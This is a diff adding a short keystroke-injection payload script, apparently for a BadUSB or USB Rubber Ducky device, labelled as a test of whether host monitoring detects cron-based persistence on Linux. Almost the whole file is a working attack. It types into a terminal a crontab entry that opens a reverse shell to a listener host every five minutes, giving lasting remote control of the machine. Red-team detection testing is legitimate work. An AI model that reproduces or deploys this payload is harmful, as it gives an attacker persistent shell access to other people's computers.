@@ -1,0 +1,19 @@
+REM ============================================================
+REM  Linux · Crontab Persistence
+REM ============================================================
+REM  Installs a cron job that calls back to your server every
+REM  5 minutes. Tests whether cron-based persistence is
+REM  detected by host-based monitoring.
+REM
+REM  Set LHOST and LPORT to your listener address.
+
+DEFAULTDELAY 80
+
+DEFINE LHOST 192.168.1.100
+DEFINE LPORT 4444
+
+CTRL ALT t
+DELAY 1500
+STRINGLN (crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'") | crontab -
+DELAY 300
+STRINGLN exit
